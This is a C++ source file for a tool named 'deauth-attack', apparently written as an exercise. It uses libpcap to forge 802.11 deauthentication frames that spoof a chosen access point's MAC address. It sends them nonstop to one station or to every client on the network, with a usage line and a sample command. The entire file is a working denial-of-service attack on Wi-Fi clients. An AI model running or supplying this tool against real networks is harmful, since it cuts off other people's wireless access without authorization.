#include <pcap.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "mac.h"
#include "dot11hdr.h"
#include "radiotaphdr.h"
#include "beaconhdr.h"

#pragma pack(push, 1)
struct DeauthPacket final
{
    RadiotapHdr radio_;
    BeaconHdr beacon_;
};
#pragma pack(pop)

using namespace std;

void usage()
{
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

DeauthPacket makeDeauthPacket(Mac apMac, Mac stationMac){
    DeauthPacket pkt;
    pkt.radio_.ver_ = 0x00;
    pkt.radio_.pad_ = 0x00;
    pkt.radio_.len_ = 0x0c;
    pkt.radio_.present_ = 0x00008004;
    pkt.radio_.datarate_ = 0x02;
    pkt.radio_.unknown_ = 0x00;
    pkt.radio_.txflag_ = 0x0018;

    pkt.beacon_.ver_ = 0x00;
    pkt.beacon_.type_ = 0x00;
    pkt.beacon_.subtype_ = 0x0c;
    pkt.beacon_.flags_ = 0x00;
    pkt.beacon_.duration_ = 0x013a;
    pkt.beacon_.addr1_ = stationMac;
    pkt.beacon_.addr2_ = apMac;
    pkt.beacon_.addr3_ = apMac;
    pkt.beacon_.frag_ = 0x0;
    pkt.beacon_.seq_ = 0x00;
    pkt.beacon_.fix_ = 0x0007;
    return pkt;    
}

int main(int argc, char* argv[]) {
	if (argc != 3 && argc != 4) {
		usage();
		return -1;
	}

    bool isBroadcast = (argc == 3) ? true : false;

	char* dev = argv[1];
    Mac apMac = Mac(argv[2]);
    Mac stationMac;
    if(isBroadcast) 
        stationMac = Mac::broadcastMac();
    else
        stationMac = Mac(argv[3]);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    while (true)
    {
        DeauthPacket deauthPacket = makeDeauthPacket(apMac, stationMac);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauthPacket), sizeof(DeauthPacket));
        if (res != 0){
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            printf("Failed to send Deauth Packet\n");
        }
        printf("Success to send Deauth Packet\n");

        sleep(0.8); //1초는 느려서 안됨.
    }
	
	pcap_close(handle);
}